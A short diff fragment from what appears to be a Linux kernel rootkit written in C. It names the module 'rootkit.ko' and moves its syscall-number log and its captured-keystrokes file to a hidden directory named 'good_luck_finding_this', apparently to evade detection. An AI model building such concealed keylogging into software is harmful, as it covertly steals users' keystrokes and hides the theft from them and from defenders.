@@ -29,8 +29,8 @@
 
 #define LINKER_FILE "rootkit.ko"
 #define MODULE_NAME "rootkit"
-#define LOGFILE "/etc/trivial/syscall_number.txt"
-#define KEYSTROKE "/etc/trivial/keystrokes.txt"
+#define LOGFILE "/etc/good_luck_finding_this/syscall_number.txt"
+#define KEYSTROKE "/etc/good_luck_finding_this/keystrokes.txt"
 
 
 
